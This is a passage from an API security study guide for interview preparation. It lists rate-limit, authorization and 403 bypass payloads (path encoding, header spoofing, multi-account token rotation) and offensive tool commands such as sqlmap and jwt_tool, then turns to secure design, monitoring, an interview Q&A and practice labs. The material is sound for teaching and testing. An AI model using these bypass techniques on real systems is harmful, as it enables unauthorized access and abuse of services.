# Rotate these headers with different IPs each request

# Endpoint variation
/api/v1/login           → rate limited
/Api/V1/Login           → bypass (case variation)
/api/v1/login/          → bypass (trailing slash)
/api/v1/login.json      → bypass (extension)
/api/v1/./login         → bypass (dot segment)
/%61pi/v1/login         → bypass (URL encoding)
/api/v1/login?x=1       → bypass (random param)

# Token rotation
# Create multiple accounts, rotate tokens
# Use different API keys if available

# Slowloris-style
# Send requests just under the rate limit threshold
# Use time-based distribution
```

### Authorization Bypass

```bash
# Header manipulation
Authorization: Bearer <token>         → normal
Authorization: bearer <token>         → case change
Authorization: BEARER <token>         → uppercase

# Parameter override
GET /api/v1/users?user_id=victim_id
→ Add: &admin=true
→ Add: &debug=1
→ Add: &internal=true
→ Add: &test=1

# Path traversal
/api/v1/user/profile     → allowed
/api/v1/admin/../user/../../admin/users → traversal

# HTTP method override
POST /api/v1/resource
X-HTTP-Method-Override: DELETE
```

### 403 Bypass Techniques

```bash
# Path fuzzing
/api/admin              → 403
/api/admin/             → 200
/api/admin/.            → 200
/api/admin/..;/admin    → 200
/api/admin;/            → 200
/api/./admin/./         → 200
/api/admin%20           → 200
/api/admin%09           → 200
/api/%61dmin            → 200

# Header-based bypass
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

---

## 8. API Security Tools Arsenal

### Reconnaissance

| Tool | Purpose | Command |
|------|---------|---------|
| **Kiterunner** | API endpoint discovery | `kr scan https://target.com -w routes-large.kite` |
| **Arjun** | Parameter discovery | `arjun -u https://target.com/api/v1/users` |
| **ffuf** | Directory/endpoint fuzzing | `ffuf -u https://target.com/api/FUZZ -w wordlist.txt` |
| **Amass** | Subdomain enumeration | `amass enum -d target.com` |
| **GAU** | URL discovery | `gau target.com \| grep api` |
| **Waybackurls** | Historical URLs | `waybackurls target.com` |

### Testing & Exploitation

| Tool | Purpose | Key Features |
|------|---------|-------------|
| **Burp Suite Pro** | API testing platform | Repeater, Intruder, Scanner, Extensions |
| **OWASP ZAP** | Open-source alternative | Automated scanning, scripting |
| **Postman** | API client | Collections, environments, tests |
| **Insomnia** | API client | GraphQL support, OAuth flows |
| **SQLmap** | SQL injection | `sqlmap -r request.txt --level 5 --risk 3` |
| **jwt_tool** | JWT testing | `jwt_tool <token> -T -S hs256 -p "secret"` |
| **GraphQLmap** | GraphQL exploitation | Introspection, injection, batching |

### Burp Suite Extensions for API Testing

```
- Autorize: Test BOLA/IDOR automatically
- JSON Web Tokens: JWT analysis and manipulation
- Param Miner: Discover hidden parameters
- InQL: GraphQL introspection and exploitation
- Content Type Converter: Switch between JSON/XML/form
- Turbo Intruder: High-speed brute force
- Auth Analyzer: Multi-user authorization testing
- Upload Scanner: File upload vulnerability testing
```

### Automated Scanners

| Tool | Focus |
|------|-------|
| **Nuclei** | Template-based vulnerability scanning |
| **Nikto** | Web server misconfiguration |
| **OWASP Amass** | Attack surface mapping |
| **Checkov** | API infrastructure-as-code scanning |

---

## 9. Secure API Design & Remediation

### Authentication Best Practices

```
✅ DO:
- Use OAuth 2.0 with PKCE for user-facing APIs
- Implement short-lived access tokens (15-30 min)
- Use refresh token rotation with reuse detection
- Hash API keys server-side (bcrypt/argon2)
- Implement MFA for sensitive operations
- Use mTLS for service-to-service communication
- Validate JWT signature, expiry, issuer, audience

❌ DON'T:
- Put credentials in URLs
- Use long-lived tokens without refresh mechanism
- Trust client-side token validation
- Use Basic Auth without TLS
- Store tokens in localStorage (use httpOnly cookies)
- Accept tokens without expiration
```

### Authorization Best Practices

```
✅ DO:
- Check authorization at the object level (every request)
- Check authorization at the function level (every endpoint)
- Check authorization at the field level (every property)
- Use RBAC or ABAC (Attribute-Based Access Control)
- Deny by default, explicitly allow
- Log all authorization failures
- Use policy engines (OPA, Casbin)

❌ DON'T:
- Rely on client-side authorization
- Trust object IDs as proof of ownership
- Check only authentication (identity ≠ authorization)
- Use security through obscurity (UUIDs are not auth)
- Implement authorization differently per endpoint
```

### Input Validation

```python
# Validate EVERYTHING:

# 1. Type checking
assert isinstance(user_id, int)

# 2. Length limits
assert len(name) <= 100

# 3. Range validation
assert 1 <= page_size <= 100

# 4. Pattern matching (allowlist)
assert re.match(r'^[a-zA-Z0-9_-]+$', username)

# 5. Schema validation (JSON Schema)
{
  "type": "object",
  "properties": {
    "name": {"type": "string", "maxLength": 100},
    "email": {"type": "string", "format": "email"},
    "age": {"type": "integer", "minimum": 0, "maximum": 150}
  },
  "required": ["name", "email"],
  "additionalProperties": false    ← Block mass assignment!
}
```

### Rate Limiting Strategy

```
Tier 1 — Global: 1000 req/min per IP
Tier 2 — Per User: 100 req/min per user
Tier 3 — Per Endpoint: Varies
  - Login: 5 attempts/min
  - OTP: 3 attempts/min
  - Search: 30 req/min
  - Data export: 5 req/hour
Tier 4 — Per Operation Cost: GraphQL complexity budget

Headers to return:
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1618534600
Retry-After: 30
```

### API Security Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    API Gateway Layer                       │
│  ┌─────────┐ ┌──────────┐ ┌───────────┐ ┌────────────┐  │
│  │  Auth    │ │   Rate   │ │   WAF     │ │  Request   │  │
│  │  Check   │ │  Limiter │ │  Rules    │ │  Validator │  │
│  └─────────┘ └──────────┘ └───────────┘ └────────────┘  │
├──────────────────────────────────────────────────────────┤
│                    Application Layer                       │
│  ┌─────────┐ ┌──────────┐ ┌───────────┐ ┌────────────┐  │
│  │ Object  │ │ Function │ │  Input    │ │  Business  │  │
│  │  AuthZ  │ │  AuthZ   │ │  Sanitize │ │  Logic     │  │
│  └─────────┘ └──────────┘ └───────────┘ └────────────┘  │
├──────────────────────────────────────────────────────────┤
│                    Data Layer                               │
│  ┌─────────┐ ┌──────────┐ ┌───────────┐ ┌────────────┐  │
│  │ Field   │ │ Parameterized│ │ Encryption│ │  Audit   │  │
│  │  AuthZ  │ │ Queries      │ │ at Rest   │ │  Logging │  │
│  └─────────┘ └──────────────┘ └───────────┘ └──────────┘  │
└──────────────────────────────────────────────────────────┘
```

### Logging & Monitoring

```
Log these API events:
- All authentication attempts (success + failure)
- All authorization failures
- Input validation failures
- Rate limit hits
- 4xx and 5xx errors
- Sensitive data access
- Admin actions
- Configuration changes

Alert on:
- Spike in 401/403 errors (brute force)
- Sequential ID access patterns (BOLA)
- Unusual geographic locations
- Abnormal request volumes
- New/unknown API keys
- Deprecated endpoint usage
```

---

## 10. Interview Cheat Sheet

### Quick Reference: API Vulnerability Identification

| If You See... | Test For... |
|--------------|-------------|
| Numeric IDs in URLs | BOLA (IDOR) |
| User input in URLs fetched by server | SSRF |
| JWT tokens | Alg none, confusion, weak secret |
| GraphQL endpoint | Introspection, batching, depth |
| JSON body with object fields | Mass assignment |
| Login/OTP endpoint | Brute force, rate limiting |
| File upload endpoint | Size limits, type validation |
| API returning extra fields | Excessive data exposure |
| Multiple API versions | Old version exploitation |
| CORS headers | Misconfigured origins |
| WebSocket connection | Message injection, auth bypass |
| Webhook URL input | SSRF via webhook |
| Third-party API integration | Unsafe consumption |

### Top Interview Questions & Answers

**Q: What's the difference between BOLA and Broken Function Level Authorization?**
A: BOLA (API1) = accessing *another user's object* (horizontal). BFLA (API5) = accessing *another function/role* (vertical). BOLA: user A reads user B's orders. BFLA: regular user accesses admin endpoint.

**Q: How would you test an API for BOLA?**
A: Create two accounts (user A, user B). Capture user A's requests. Replace user A's object IDs with user B's IDs in every endpoint. Automate with Burp's Autorize extension. Test all CRUD operations.

**Q: What's the most critical API vulnerability and why?**
A: BOLA — it's #1 on OWASP API Top 10 because it's extremely common, easy to exploit, hard to detect with automated scanners, and gives direct access to other users' data.

**Q: How would you secure a REST API from scratch?**
A: 1) OAuth 2.0 + JWT with short expiry, 2) Object-level authorization on every endpoint, 3) Input validation with JSON Schema, 4) Rate limiting (per user + per endpoint), 5) CORS with explicit origins, 6) Security headers, 7) Logging + monitoring + alerting, 8) API gateway with WAF, 9) Automated security testing in CI/CD.

**Q: Explain JWT algorithm confusion attack.**
A: Server uses RS256 (asymmetric: private key signs, public key verifies). Attacker changes alg to HS256 (symmetric: same key signs AND verifies). Attacker signs token with the PUBLIC key using HMAC. Server's verification code uses the public key with HS256 and signature matches. Fix: Always validate the algorithm server-side, never from the token header.

**Q: How to prevent mass assignment?**
A: 1) Use allowlists of writable fields, 2) Use DTOs/view models separate from database models, 3) JSON Schema with `additionalProperties: false`, 4) Framework-level protections (Rails strong_parameters, Django serializer fields).

**Q: How would you prevent SSRF in an API?**
A: 1) URL allowlisting (only permitted domains), 2) Block private IPs (10.x, 172.16.x, 192.168.x, 169.254.x, 127.x), 3) Disable non-HTTP schemes, 4) Don't follow redirects (or validate redirect targets), 5) Use IMDSv2 for cloud metadata, 6) Network segmentation, 7) DNS resolution validation.

---

## Appendix: Practice Labs & Resources

### Hands-On Practice
- **OWASP crAPI** — Completely Ridiculous API (purpose-built vulnerable API)
- **Damn Vulnerable GraphQL Application (DVGA)**
- **OWASP Juice Shop** — Has API challenges
- **HackTheBox** — API-focused machines
- **PortSwigger Web Security Academy** — API testing labs
- **Postman API Security** — Guided API testing exercises

### Essential Reading
- OWASP API Security Top 10 (2023): https://owasp.org/API-Security/
- OWASP API Security Testing Guide
- "Hacking APIs" by Corey Ball (No Starch Press)
- "Black Hat GraphQL" by Nick Aleks & Dolev Farhi

### Checklists
- OWASP API Security Testing Checklist
- HackTricks API Pentesting Guide
- PayloadsAllTheThings — API Testing section

---

*Created by Viktor AI — API Vulnerabilities Masterclass for FAANG Security Engineer Preparation*
